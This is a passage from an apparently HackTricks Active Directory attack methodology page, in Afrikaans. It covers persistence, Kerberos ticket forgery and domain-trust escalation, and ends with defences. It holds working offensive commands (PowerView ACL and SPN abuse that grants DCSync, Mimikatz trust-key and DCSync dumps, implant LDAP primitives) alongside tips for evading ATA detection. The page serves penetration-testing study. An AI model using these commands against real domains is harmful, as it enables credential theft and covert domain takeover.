
{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Sertifikaat-templates misbruik

As **vatbare templates** geconfigureer is, is dit moontlik om dit te misbruik om voorregte op te skerp:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation met 'n hoë-voorregte rekening

### Dumping Domain Credentials

Sodra jy **Domain Admin** of nog beter **Enterprise Admin** voorregte kry, kan jy die **domein-databasis** dump: _ntds.dit_.

[**Meer inligting oor die DCSync-aanval is hier te vinde**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steel is hier te vinde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke hierbo bespreek kan vir persistence gebruik word.\
Byvoorbeeld, jy kan:

- Maak gebruikers kwesbaar vir [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Maak gebruikers kwesbaar vir [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Gee [**DCSync**](#dcsync) voorregte aan 'n gebruiker

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep 'n **legitieme Ticket Granting Service (TGS) ticket** vir 'n spesifieke diens deur die gebruik van die **NTLM hash** (byvoorbeeld, die **hash van die PC account**). Hierdie metode word gebruik om **toegang tot daardie diens se voorregte** te kry.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

'n **Golden Ticket attack** behels dat 'n aanvaller toegang verkry tot die **NTLM hash van die krbtgt account** in 'n Active Directory-omgewing. Hierdie account is spesiaal aangesien dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te teken, wat noodsaaklik is vir verifikasie binne die AD-netwerk.

Sodra die aanvaller hierdie hash bekom, kan hulle **TGTs** skep vir enige rekening wat hulle kies (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hierdie is soos golden tickets wat vervals is op 'n wyse wat **algemene golden ticket-detektiemeganismes omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Om sertifikate van 'n rekening te hê of dit te kan versoek** is 'n baie goeie manier om in die gebruikersrekening te kan bly (selfs as hulle die wagwoord verander):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Om sertifikate te gebruik maak dit ook moontlik om met hoë voorregte binne die domein te bly:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-object in Active Directory verseker die veiligheid van **geprivilegieerde groepe** (soos Domain Admins en Enterprise Admins) deur 'n standaard **Access Control List (ACL)** oor hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter uitgebuit word; as 'n aanvaller die AdminSDHolder se ACL wysig om volle toegang aan 'n gewone gebruiker te gee, kry daardie gebruiker uitgebreide beheer oor alle geprivilegieerde groepe. Hierdie sekuriteitsmaatreël, bedoel om te beskerm, kan dus terugskop en ongewenste toegang toelaat tensy dit noukeurig gemonitor word.

[**Meer inligting oor AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

In elke **Domain Controller (DC)** bestaan daar 'n **lokale administrator**-rekening. Deur admin-regte op so 'n masjien te bekom, kan die lokale Administrator-hash met **mimikatz** uitgehaal word. Daarna is 'n register-wysiging nodig om **die gebruik van hierdie wagwoord moontlik te maak**, wat remote toegang tot die lokale Administrator-rekening toelaat.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan sekere **spesiale toestemmings** aan 'n **gebruiker** gee oor spesifieke domein-objects wat die gebruiker in die toekoms sal toelaat om **voorregte te eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **toestemmings** wat 'n **object** oor 'n **object** het, te **stoor**. As jy net 'n **klein verandering** in die **security descriptor** van 'n object kan maak, kan jy baie interessante voorregte oor daardie object verkry sonder om lid van 'n geprivilegieerde groep te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Misbruik die `dynamicObject` auxiliary class om kortlewende principals/GPOs/DNS-rekords met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle self-verwyder sonder tombstones, wat LDAP-evidensie uitwis terwyl hulle verweerde SIDs, gebroke `gPLink`-verwysings, of gecachte DNS-antwoorde agterlaat (bv. AdminSDHolder ACE-besoedeling of kwaadwillige `gPCFileSysPath`/AD-geïntegreerde DNS-omleidings).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in geheue om 'n **universele wagwoord** te vestig, wat toegang tot alle domeinrekenings gee.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om **credentials** wat gebruik word om by die masjien aan te meld in **clear text** te **vang**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer 'n **nuwe Domain Controller** in die AD en gebruik dit om **attribuute** (SIDHistory, SPNs...) op gespesifiseerde objects **te push** **sonder** om enige **logs** oor die **wysigings** agter te laat. Jy **het DA**-voorregte nodig en moet binne die **root domain** wees.\
Let daarop dat as jy verkeerde data gebruik, nogal lelike logs sal verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Voorheen het ons bespreek hoe om voorregte op te skerp as jy **genoeg toestemming het om LAPS-wagwoorde te lees**. Hierdie wagwoorde kan egter ook gebruik word om **persistence** te behou.\
Sien:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft sien die **Forest** as die sekuriteitsgrens. Dit impliseer dat **die kompromittering van 'n enkele domein moontlik tot die kompromittering van die hele Forest kan lei**.

### Basiese inligting

'n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is 'n sekuriteitsmeganisme wat 'n gebruiker van een **domein** toelaat om hulpbronne in 'n ander **domein** te gebruik. Dit skep 'n skakel tussen die verifikasiesisteme van die twee domeine, wat verifikasie-vloei naatloos laat gebeur. Wanneer domeine 'n trust opstel, ruil hulle sekere **sleutels** uit wat binne hul **Domain Controllers (DCs)** gehou word en wat noodsaaklik is vir die integriteit van die trust.

In 'n tipiese scenario, as 'n gebruiker 'n diens in 'n **vertroude domein** wil toegang, moet hulle eers 'n spesiale kaartjie, bekend as 'n **inter-realm TGT**, vanaf hul eie domein se DC versoek. Hierdie TGT is met 'n gedeelde **sleutel** geënkripteer wat beide domeine ooreengekom het. Die gebruiker bied dan hierdie TGT aan die **DC van die vertroude domein** om 'n diensticket (**TGS**) te kry. Na bevestiging van die inter-realm TGT deur die vertroude domein se DC, gee dit 'n TGS uit wat die gebruiker toegang tot die diens verleen.

**Stappe**:

1. 'n **Client rekenaar** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om 'n **Ticket Granting Ticket (TGT)** van sy **Domain Controller (DC1)** te versoek.
2. DC1 gee 'n nuwe TGT as die kliënt suksesvol geverifieer is.
3. Die kliënt versoek dan 'n **inter-realm TGT** van DC1, wat benodig word om hulpbronne in **Domain 2** te toegang.
4. Die inter-realm TGT is geënkripteer met 'n **trust key** wat tussen DC1 en DC2 gedeel word as deel van die twee-weg domain trust.
5. Die kliënt neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en, as dit geldig is, gee 'n **Ticket Granting Service (TGS)** uit vir die bediener in Domain 2 wat die kliënt wil gebruik.
7. Laastens bied die kliënt hierdie TGS aan die bediener, wat met die bediener se account-hash geënkripteer is, om toegang tot die diens in Domain 2 te kry.

### Verskillende trusts

Dit is belangrik om te let dat **'n trust 1-weg of 2-weg kan wees**. In die 2-weg opsie vertrou beide domeine mekaar, maar in die **1-weg** trustverhouding sal een van die domeine die **vertroude** wees en die ander die **vertrouende** domein. In laasgenoemde geval sal **jy slegs hulpbronne binne die vertrouende domein van die vertroude een kan toegang**.

As Domain A Domain B vertrou, is A die vertrouende domein en B die vertroude een. Verder sal dit in **Domain A** 'n **Outbound trust** wees; en in **Domain B** 'n **Inbound trust**.

**Verskillende vertrouingsverhoudings**

- **Parent-Child Trusts**: Dit is 'n algemene opstelling binne dieselfde forest, waar 'n child domain outomaties 'n twee-weg transitive trust met sy parent domain het. Dit beteken basies dat verifikasieveroë tussen die parent en die child naatloos kan vloei.
- **Cross-link Trusts**: Genoem "shortcut trusts," hierdie word tussen child domains ingestel om verwysingsprosesse te versnel. In komplekse forests moet verifikasieverwysings gewoonlik opgaan na die forest root en dan afgaan na die teikendomein. Deur cross-links te skep, word die reis verkort, wat veral nuttig is in geografies verspreide omgewings.
- **External Trusts**: Hierdie word ingestel tussen verskillende, unrelated domeine en is van aard nie-transitive nie. Volgens [Microsoft's dokumentasie](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig vir toegang tot hulpbronne in 'n domein buite die huidige forest wat nie deur 'n forest trust verbind is nie. Sekuriteit word versterk deur SID filtering by external trusts.
- **Tree-root Trusts**: Hierdie trusts word outomaties tussen die forest root domain en 'n nuut bygevoegde tree root gevestig. Alhoewel nie gereeld teëgekom nie, is tree-root trusts belangrik vir die byvoeging van nuwe domain trees tot 'n forest, wat hulle toelaat om 'n unieke domain-naam te behou en twee-weg transitivity te verseker. Meer inligting is beskikbaar in [Microsoft's gids](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Hierdie tipe trust is 'n twee-weg transitive trust tussen twee forest root domeine, en handhaaf ook SID filtering om sekuriteitsmaatreëls te verbeter.
- **MIT Trusts**: Hierdie trusts word tot stand gebring met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-domeine. MIT trusts is meer gespesialiseerd en dien om integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem toe te laat.

#### Ander verskille in **vertrouingsverhoudings**

- 'n trustverhouding kan ook **transitief** wees (A vertrou B, B vertrou C, dan vertrou A C) of **nie-transitief**.
- 'n trustverhouding kan ingestel word as **bidirectional trust** (albei vertrou mekaar) of as **one-way trust** (slegs een vertrou die ander).

### Aanvals-pad

1. **Enumereer** die vertrouingsverhoudings
2. Gaan na of enige **security principal** (user/group/computer) **toegang** het tot hulpbronne van die **ander domein**, moontlik deur ACE-inskrywings of deur in groepe van die ander domein te wees. Soek **verhoudings oor domeine** (waarskynlik is die trust daarvoor geskep).
1. kerberoast in hierdie geval kan 'n ander opsie wees.
3. **Kompromitteer** die **rekeninge** wat deur die **pivot** tussen domeine kan werk.

Aanvallers kan deur drie primêre meganismes toegang tot hulpbronne in 'n ander domein hê:

- **Local Group Membership**: Principals kan by plaaslike groepe op masjiene gevoeg word, soos die “Administrators” groep op 'n bediener, wat hulle beduidende beheer oor daardie masjien gee.
- **Foreign Domain Group Membership**: Principals kan ook lede van groepe binne die vreemde domein wees. Die effektiwiteit van hierdie metode hang egter af van die aard van die trust en die omvang van die groep.
- **Access Control Lists (ACLs)**: Principals kan in 'n **ACL** gespesifiseer word, veral as entiteite in **ACEs** binne 'n **DACL**, wat hulle toegang tot spesifieke hulpbronne gee. Vir dieper insig in die meganika van ACLs, DACLs en ACEs, is die whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 'n baie waardevolle hulpbron.

### Vind eksterne gebruikers/groepe met toestemmings

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** nagaan om foreign security principals in die domein te vind. Hierdie sal gebruikers/groepe van **'n eksterne domein/forest** wees.

Jy kan dit in **Bloodhound** of met powerview nagaan:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domeinvertroue te lys:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 vertroude sleutels**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domein gebruik word, vind met:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaleer as Enterprise admin na die child/parent-domein deur die trust te misbruik met SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Dit is kritiek om te verstaan hoe die Configuration Naming Context (NC) misbruik kan word. Die Configuration NC dien as ’n sentrale bewaarplek vir konfigurasiedata oor ’n forest in Active Directory (AD)-omgewings. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, met skryfbare DCs wat ’n skryfbare kopie van die Configuration NC handhaaf. Om dit te misbruik, moet jy **SYSTEM privileges on a DC** hê, by voorkeur ’n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites-container sluit inligting in oor die sites van alle domeinglyk gekoppelde rekenaars binne die AD-forest. Deur met SYSTEM-regte op enige DC te werk, kan aanvallers GPOs koppel aan die root DC-sites. Hierdie aksie kan moontlik die root-domein kompromitteer deur die beleide wat op hierdie sites toegepas word, te manipuleer.

Vir diepgaande inligting kan jy navorsing oor [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) ondersoek.

**Compromise any gMSA in the forest**

’n Aanvalsvektor behels die teiken van bevoorregte gMSAs binne die domein. Die KDS Root key, noodsaaklik vir die berekening van gMSAs se wagwoorde, word in die Configuration NC gestoor. Met SYSTEM-regte op enige DC is dit moontlik om toegang tot die KDS Root key te kry en die wagwoorde vir enige gMSA oor die forest te bereken.

Gedetaileerde analise en stap-vir-stap leiding is te vinde in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende gedelegeerde MSA-aanval (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Addisionele eksterne navorsing: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Hierdie metode verg geduld — wag vir die skepping van nuwe bevoorregte AD-objekte. Met SYSTEM-regte kan ’n aanvaller die AD Schema wysig om enige gebruiker volledige beheer oor alle klasse te gee. Dit kan lei tot ongemagtigde toegang en beheer oor nuut geskepte AD-objekte.

Verder leesmateriaal is beskikbaar op [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-kwesbaarheid mik op beheer oor Public Key Infrastructure (PKI)-objekte om ’n sertifikaattemplate te skep wat verifikasie as enige gebruiker binne die forest moontlik maak. Aangesien PKI-objekte in die Configuration NC woon, maak die kompromittering van ’n skryfbare child DC die uitvoering van ESC5-aanvalle moontlik.

Meer besonderhede hieroor is beskikbaar by [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenario's sonder ADCS het die aanvaller die vermoë om die nodige komponente op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario word **jou domein** deur 'n eksterne een vertrou, wat jou **onbepaalde regte** oor daardie domein gee. Jy sal moet uitvind **watter principals van jou domein watter toegang tot die eksterne domein het** en dan probeer om dit uit te buit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest-domein - Eenrigting (Uitgaand)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario vertrou **jou domein** sekere **regte** aan 'n principal van 'n **verskillende domein**.

Maar, wanneer 'n **domain is trusted** deur die vertroulende domein, skep die vertroude domein **'n gebruiker** met 'n **voorspelbare naam** wat as **wagwoord die trusted password** gebruik. Dit beteken dat dit moontlik is om **'n gebruiker van die vertroulende domein te gebruik om in die vertroude domein in te kom** om dit te enumereer en te probeer om meer regte te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog 'n manier om die vertroude domein te kompromitteer is om 'n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **omgekeerde rigting** van die domeinvertroue geskep is (wat nie baie algemeen is nie).

Nog 'n manier om die vertroude domein te kompromitteer is om in 'n masjien te wag waar 'n **gebruiker van die vertroude domein toegang het** om via **RDP** aan te meld. Die aanvaller kan dan kode in die RDP-sessieproses injekteer en **van daar af toegang tot die oorspronklike domein van die slagoffer kry**.\
Boonop, as die **slagoffer sy hardeskyf gemonteer het**, kan die aanvaller vanuit die **RDP-sessie** proses **backdoors** stoor in die **opstartmap van die hardeskyf**. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigasie van misbruik van domeinvertroue

### **SID Filtering:**

- Die risiko van aanvalle wat die SID history-attribuut oor forest trusts benut, word gemitigeer deur SID Filtering, wat standaard geaktiveer is op alle inter-forest trusts. Dit berus op die aanname dat intra-forest trusts veilig is, en die forest eerder as die domain as die sekuriteitsgrens beskou word volgens Microsoft se standpunt.
- Daar is egter 'n vangs: SID filtering kan toepassings en gebruikerstoegang ontwrig, wat soms tot die deaktivering daarvan lei.

### **Selective Authentication:**

- Vir inter-forest trusts verseker die gebruik van Selective Authentication dat gebruikers van die twee forests nie outomaties geverifieer word nie. In plaas daarvan is eksplisiete permissies benodig vir gebruikers om toegang tot domeine en bedieners binne die vertroulende domein of forest te kry.
- Dit is belangrik om te let dat hierdie maatreëls nie beskerming bied teen die misbruik van die writable Configuration Naming Context (NC) of teen aanvalle op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-style LDAP primitives as x64 Beacon Object Files wat heeltemal binne 'n on-host implant (bv. Adaptix C2) loop. Operateurs kompileer die pakket met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon aan. Al die verkeer gebruik die huidige aanmeld-sekuriteitskonteks oor LDAP (389) met signing/sealing of LDAPS (636) met auto certificate trust, so geen socks proxies of skyf-artefakte is nodig nie.

### Implant-side LDAP enumerasie

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` los kort name/OU-paaie op na volle DNs en dump die ooreenstemmende objekte.
- `get-object`, `get-attribute`, and `get-domaininfo` trek arbitrêre attribuute (insluitend security descriptors) plus die forest/domain metadata vanaf `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` openbaar roasting candidates, delegation settings, en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direk vanaf LDAP.
- `get-acl` and `get-writable --detailed` ontleed die DACL om trustees, regte (GenericAll/WriteDACL/WriteOwner/attribute writes), en erfenis te lys, wat onmiddellike teikens vir ACL privilege escalation gee.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives vir eskalasie en permanente toegang

- Objekskepping BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operateur toe om nuwe principals of masjienrekeninge te plaas waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` neem teikens direk oor sodra write-property-regte gevind word.
- ACL-gefokusde opdragte soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD-voorwerp in wagwoordherstel, groeplidmaatskapbeheer, of DCSync-replikasievoorregte sonder om PowerShell/ADSI-artefakte te laat. `remove-*` eweknieë skoonmaak ingebedde ACEs.

### Delegasie, roasting en Kerberos-misbruik

- `add-spn`/`set-spn` maak 'n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC toggle) merk dit vir AS-REP roasting sonder om die wagwoord te raak.
- Delegasie-makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC-vlae, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD-aanvalsweë moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory injection, OU-verplasing en vorming van die aanval-oppervlak

- `add-sidhistory` injecteer bevoorregte SIDs in 'n beheerde principal se SID-geskiedenis (see [SID-History Injection](sid-history-injection.md)), wat stilstaande toegangserwing oor LDAP/LDAPS verskaf.
- `move-object` verander die DN/OU van rekenaars of gebruikers, wat 'n aanvaller toelaat om bates in OUs te sleep waar gedelegeerde regte reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Nou gespesifiseerde verwyder-opdragte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) maak vinnige rollback moontlik nadat die operateur kredensiële of persistensie ingesamel het, wat telemetrie minimaliseer.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algemene verdedigingsmaatreëls

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Verdedigingsmaatreëls vir beskerming van inlogbewyse**

- **Beperkings vir Domain Admins**: Dit word aanbeveel dat Domain Admins slegs op Domain Controllers mag aanmeld, en dat hul gebruik op ander gastrekenaars vermy word.
- **Voorregte van diensrekeninge**: Dienste moet nie met Domain Admin (DA)-voorregte uitgevoer word nie om sekuriteit te handhaaf.
- **Tydelike beperking van voorregte**: Vir take wat DA-voorregte benodig, moet hul duur beperk word. Dit kan bereik word deur: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay-mitigasie**: Oudit Gebeurtenis-ID's 2889/3074/3075 en dwing daarna LDAP signing plus LDAPS channel binding op DCs/clients af om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementering van misleidingstegnieke**

- Implementering van misleiding behels die stel van lokvalle, soos decoy-gebruikers of -rekenaars, met eienskappe soos wagwoorde wat nie verval nie of wat gemerk is as Trusted for Delegation. 'n Gedetaileerde benadering sluit in die skep van gebruikers met spesifieke regte of om hulle by hoë-voorreg-groepe te voeg.
- 'n Praktiese voorbeeld behels die gebruik van gereedskap soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van misleidingstegnieke is te vind by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifisering van misleiding**

- **Vir gebruikeritems**: Verdagte aanduiders sluit in ontipiese ObjectSID, seldsame aanmeldings, skeppingsdatums, en 'n lae aantal verkeerde wagwoordpogings.
- **Algemene aanduiders**: Vergelyking van attributte van potensiële decoy-items met dié van werklike items kan teenstrydighede openbaar. Gereedskap soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke misleidings te identifiseer.

### **Omseiling van deteksiesisteme**

- **Microsoft ATA deteksie-omseiling**:
- **User Enumeration**: Om sessie-enumerasie op Domain Controllers te vermy om ATA-detekering te voorkom.
- **Ticket Impersonation**: Gebruik van **aes** sleutels vir kaartjie-creating help om deteksie te ontduik deur nie te downgrade na NTLM nie.
- **DCSync Attacks**: Dit word aanbeveel om vanaf 'n nie-Domain Controller uit te voer om ATA-detekering te vermy, aangesien direkte uitvoering vanaf 'n Domain Controller seine sal veroorsaak.

## Verwysings

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
